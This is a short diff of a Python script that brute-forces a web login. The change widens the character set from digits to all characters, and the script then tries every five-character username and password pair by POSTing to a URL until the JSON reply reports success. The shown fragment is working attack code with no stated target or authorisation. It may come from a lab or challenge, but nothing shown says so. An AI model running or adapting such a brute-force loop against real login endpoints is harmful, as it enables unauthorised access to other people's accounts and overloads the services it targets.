@@ -14,9 +14,9 @@ if __name__ == '__main__':
 
     while not success:
         # for every combination of five characters,check for username and password.
-        for i in product(number_char, repeat=5):
+        for i in product(all_char, repeat=5):
             trial_username = ''.join(i)
-            for j in product(number_char, repeat=5):
+            for j in product(all_char, repeat=5):
                 trial_password = ''.join(j)
                 response = POST(URL, data={'username': trial_username, 'password': trial_password})
                 success = json.loads(response.text).get('success')
